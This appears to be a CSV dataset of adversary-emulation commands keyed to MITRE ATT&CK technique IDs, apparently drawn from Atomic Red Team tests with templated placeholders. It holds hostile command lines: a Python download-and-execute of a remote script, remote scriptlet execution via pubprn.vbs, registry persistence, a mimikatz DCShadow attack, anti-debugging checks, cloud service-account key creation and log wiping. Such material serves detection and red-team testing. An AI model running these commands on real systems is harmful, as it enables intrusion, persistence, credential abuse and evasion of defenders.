mitre_id,command
T1090,networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port} networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port} 
T1059,"which_python=$(which python || which python3 || which python3.9 || which python2) $which_python -c 'import requests;import os;url = ""#{script_url}"";malicious_command = ""#{executor} #{payload_file_name} #{script_args}"";session = requests.session();source = session.get(url).content;fd = open(""#{payload_file_name}"", ""wb+"");fd.write(source);fd.close();os.system(malicious_command)' # id_4965"
T1055,"""#{exe_binary}"" "
T1217,where /r c:\users\ places.sqlite  
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
T1217,where /r c:\users\ places.sqlite # id_4139
T1216,"cscript.exe /b c:\windows\system32\printing_admin_scripts\en-us\pubprn.vbs localhost ""script:#{remote_payload}"" "
T1127,"copy ""#{filename}"" %temp%\libhello.js #{jscpath}\#{jscname} /t:library %temp%\libhello.js"
T1547,"net stop w32time copy-item ""$pathtoatomicsfolder\t1547.003\bin\atomictest.dll"" c:\users\public\atomictest.dll reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest"" /t reg_sz /v ""dllname"" /d ""c:\users\public\atomictest.dll"" /f reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest"" /t reg_dword /v ""enabled"" /d ""1"" /f reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest"" /t reg_dword /v ""inputprovider"" /d ""1"" /f net start w32time"
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached # id_4522"
T1221,"start ""#{docx_file}"" "
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer "
T1078,gcloud config set project #{project-id} gcloud iam service-accounts create #{service-account-name} gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}  
T1547,"reg add ""hklm\system\currentcontrolset\control\terminal server\wds\rdpwd"" /f /v startupprograms /t reg_sz /d ""#{malicious_app}"""
T1222,"reg add ""hklm\system\currentcontrolset\control\filesystem"" /v symlinkremotetolocalevaluation /t reg_dword /d ""1"" /f reg add ""hklm\system\currentcontrolset\control\filesystem"" /v symlinkremotetoremoteevaluation /t reg_dword /d ""1"" /f # id_7354"
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`"""" $dc = start-process -filepath cmd.exe -verb runas -argumentlist ""/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzparam"" # wait for fake dc server to be ready... start-sleep -seconds 5 # server ready, so trigger replication (push) and wait until it finished & ""#{mimikatz_path}"" ""lsadump::dcshadow /push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"" # id_8442"
T1070,truncate -s 0 /var/log/messages #size parameter shorthand truncate --size=0 /var/log/security #size parameter # id_5096
